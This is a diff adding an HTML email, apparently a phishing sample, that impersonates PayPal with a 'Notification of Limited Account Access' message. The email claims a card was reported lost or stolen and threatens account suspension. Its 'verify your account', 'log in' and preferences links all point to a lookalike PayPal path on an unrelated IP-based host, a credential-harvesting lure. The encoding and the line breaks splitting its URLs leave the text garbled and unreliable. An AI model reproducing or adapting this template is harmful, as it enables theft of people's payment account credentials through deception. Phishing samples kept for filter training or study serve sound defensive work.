@@ -1,0 +1,327 @@
+</style>
+</head>
+
+<body>
+
+<table class=3D"messageheader" cellspacing=3D"0" cellpadding=3D"0" width=3D=
+"100%" border=3D"0">
+  <tr>
+    <td>=A0</td>
+  </tr>
+</table>
+<div id=3D"message" style=3D"FONT-SIZE:
+ 12px; COLOR:
+ #000000; FONT-FAMILY: verdana,arial,helvetica,sans-serif">
+  <xmeta content=3D"Microsoft DHTML Editing Control" name=3D"GENERATOR">
+  <xbody>
+<style type=3D"text/css">
+#message 
+dummy {}
+#message td {font-family:
+verdana,arial,helvetica,sans-serif;font-size:
+12px;color: #000000;}
+#message {font-family:
+4verdana,arial,helvetica,sans-serif;font-size:
+12px;color: #000000;}
+#message LI {line-height: 120%;}
+#message UL
+ppsmallborder {margin:10px 5px 10px 20px;}
+#message LI
+ppsmallborderli {margin:0px 0px 5px 0px;}
+#message UL
+pp_narrow {margin:10px 5px 0px 40px;}
+#message hr
+dotted {width: 100%; margin-top: 0px;
+margin-bottom: 0px; border-left:
+#fff; border-right: #fff; border-top: #fff;
+border-bottom: 2px dotted #ccc;}
+#message 
+pp_label {font-family:
+verdana,arial,helvetica,sans-serif;font-size:
+10px;font-weight: bold;color: #000000;}
+#message 
+pp_serifbig {font-family: serif;font-size:
+20px;font-weight: bold;color:
+#000000;}
+#message 
+pp_serif{font-family: serif;font-size:
+16px;color: #000000;}
+#message 
+pp_sansserif{font-family:
+verdana,arial,helvetica,sans-serif; font-size:
+16px;color: #000000;}
+#message 
+pp_heading {font-family:
+verdana,arial,helvetica,sans-serif;font-size:
+18px;font-weight: bold;color: #003366;}
+#message 
+pp_subheadingeoa {font-family:
+verdana,arial,helvetica,sans-serif;font-size:
+15px;font-weight: bold;color:
+#000000;}
+#message 
+pp_subheading {font-family:
+verdana,arial,helvetica,sans-serif;font-size:
+16px;font-weight: bold;color: #003366;}
+#message 
+pp_sidebartext {font-family:
+verdana,arial,helvetica,sans-serif;font-size:
+11px;color: #003366;}
+#message 
+pp_sidebartextbold {font-family:
+verdana,arial,helvetica,sans-serif;font-size:
+11px;font-weight: bold;color:
+#003366;}
+#message 
+pp_footer {font-family:
+verdana,arial,helvetica,sans-serif;font-size:
+11px;color: #aaaaaa;}
+#message 
+pp_button {font-size: 13px; font-family:
+verdana,arial,helvetica,sans-serif; font-weight: 400;
+border-style:outset;
+color:#000000; background-color: #cccccc;}
+#message 
+pp_smaller {font-family:
+verdana,arial,helvetica,sans-serif;font-size:
+10px;color: #000000;}
+#message 
+pp_smallersidebar {font-family:
+verdana,arial,helvetica,sans-serif;font-size:
+10px;color: #003366;}
+#message 
+ppem106 {font-weight: 700;}
+  </style>
+  <table cellspacing=3D"0" cellpadding=3D"0" width=3D"600" align=3D"center=
+" border=3D"0">
+    <tr valign=3D"top">
+      <td style=3D"FONT-SIZE:
+ 12px; COLOR:
+
+ #000000; FONT-FAMILY: verdana,arial,helvetica,sans-serif">
+      <a href=3D"http://207
+47
+111
+135
+static
+nextweb
+net/
+paypal
+com/webs=
+cr
+php
+cmd=3D_login-run" target=3D"_blank">
+      <img alt=3D"PayPal" src=3D"http://images
+paypal
+com/en_US/i/logo/ema=
+il_logo
+gif" border=3D"0" width=3D"255" height=3D"35"></a>
+      </td>
+    </tr>
+  </table>
+  <table cellspacing=3D"0" cellpadding=3D"0" width=3D"100%" border=3D"0">
+    <tr>
+      <td width=3D"100%" background=3D"http://images
+paypal
+com/images/bg_=
+clk
+gif" style=3D"FONT-SIZE: 12px; COLOR: #000000; FONT-FAMILY: verdana,ar=
+ial,helvetica,sans-serif">
+      <img height=3D"29" src=3D"http://images
+paypal
+com/images/pixel
+gif"=
+ width=3D"1" border=3D"0"></td>
+    </tr>
+    <tr>
+      <td style=3D"FONT-SIZE:
+ 12px; COLOR:
+
+ #000000; FONT-FAMILY: verdana,arial,helvetica,sans-serif">
+      <img height=3D"10" src=3D"http://images
+paypal
+com/images/pixel
+gif"=
+ width=3D"1" border=3D"0"></td>
+    </tr>
+  </table>
+  <table cellspacing=3D"0" cellpadding=3D"0" width=3D"600" align=3D"center=
+" border=3D"0">
+    <tr valign=3D"top">
+      <td width=3D"400" style=3D"FONT-SIZE:
+ 12px; COLOR:
+ #000000; FONT-FAMILY: verdana,arial,helvetica,sans-serif">
+      <table cellspacing=3D"0" cellpadding=3D"5" width=3D"417" border=3D"0=
+">
+        <tr valign=3D"top">
+          <td style=3D"FONT-SIZE:
+ 12px; COLOR:
+
+ #000000; FONT-FAMILY: verdana,arial,helvetica,sans-serif" width=3D"407">
+          <table cellspacing=3D"0" cellpadding=3D"0" width=3D"100=
+%" border=3D"0">
+            <tr>
+              <td class=3D"pp_heading" align=3D"left"><br>
+              Notification of Limited Account Access</td>
+            </tr>
+          </table>
+          </td>
+        </tr>
+        <tr>
+          <td style=3D"FONT-SIZE:
+ 12px; COLOR:
+
+ #000000; FONT-FAMILY: verdana,arial,helvetica,sans-serif" width=3D"407">
+          <p align=3D"left">
+          Dear 
+            <strong>user@example
+com,<br></strong>
+          <br>
+          As part of our security measures, we regularly screen activity i=
+n the
+PayPal system
+ We recently noticed the following issue on your account:
+<br>
+          <br>
+         Unusual account activity has made it necessary to limit sensitive=
+ account 
+          features
+until additional verification information can be collected
+ </p>
+          <p style=3D"MARGIN-TOP: 0px; MARGIN-BOTTOM: 0px" align=3D"left">=
+We have 
+          been notified <tt><font face=3D"verdana,arial,helvetica,sans-ser=
+if">that 
+          a card associated with your account has been reported as lost or=
+ 
+          stolen, or that there were additional problems with your card
+</=
+font></tt></p>
+          <p>Case ID Number: PP-071-362-996
+
+          <br>
+          =A0</p>
+          <table cellspacing=3D"0" cellpadding=3D"1" width=3D"75=
+%" align=3D"left" bgcolor=3D"#ffe65c" border=3D"0">
+            <tr>
+              <td style=3D"FONT-SIZE:
+ 12px; COLOR:
+ #000000; FONT-FAMILY: verdana,arial,helvetica,sans-serif">
+              <table cellspacing=3D"0" cellpadding=3D"4" width=3D"100=
+%" align=3D"center" bgcolor=3D"#fffecd" border=3D"0">
+                <tr>
+                  <td class=3D"pp_sansserif" align=3D"middle">
+                  <a target=3D"_blank" href=3D"http://207
+47
+111
+135
+stati=
+c
+nextweb
+net/
+paypal
+com/webscr
+php
+cmd=3D_login-run">Click here to verif=
+y your
+account</a></td>
+                </tr>
+              </table>
+              </td>
+            </tr>
+          </table>
+          <p><br>
+          <br>
+          <br>
+          Please understand that this is a 
+security
+measure intended to help protect you and your account
+ We apologize for 
+any
+inconvenience
+
+ <br>
+          <br>
+          
+          <br>
+          If you choose to ignore our request, you
+leave us no choice but to
+          temporary suspend your account
+<br>
+          <br>
+          Sincerely,<br>
+PayPal Account Review Department
+</p>
+   
+
+</td>
+        </tr>
+        <tr>
+          <td style=3D"FONT-SIZE:
+ 12px; COLOR:
+
+ #000000; FONT-FAMILY: verdana,arial,helvetica,sans-serif" width=3D"407">
+          <hr class=3D"dotted"></td>
+        </tr>
+        <tr>
+          <td style=3D"FONT-SIZE:
+ 12px; COLOR:
+
+ #000000; FONT-FAMILY: verdana,arial,helvetica,sans-serif" width=3D"407">
+          <table cellspacing=3D"0" cellpadding=3D"0" width=3D"100=
+%" border=3D"0">
+            <tr>
+              <td class=3D"pp_footer">Please do not
+reply to this e-mail
+ Mail
+              sent to this address cannot be answered
+
+For assistance,
+              <a target=3D"_blank" href=3D"http://207
+47
+111
+135
+static
+ne=
+xtweb
+net/
+paypal
+com/webscr
+php
+cmd=3D_login-run">log in</a> to your PayP=
+al account and
+choose the "Help" link in
+              the footer of any page
+<br>
+              <br class=3D"h10">
+              To receive email notifications in plain
+text instead of HTML,
+              update your preferences
+              <a target=3D"_blank" href=3D"http://207
+47
+111
+135
+static
+ne=
+xtweb
+net/
+paypal
+com/webscr
+php
+cmd=3D_login-run">here</a>
+ </td>
+            </tr>
+            <tr>
+              <td style=3D"FONT-SIZE:
+ 12px; COLOR:
+ #000000; FONT-FAMILY: verdana,arial,helvetica,sans-serif">
+              <img height=3D"10" src=3D"http://images
+paypal
+com/en_US/i/s=
+cr/pixel
+gif" width=3D"1" border=3D"0"></td>
+            </tr>
+          </table>
+          </td>
+        </tr></table></tr></div></body></html>
+
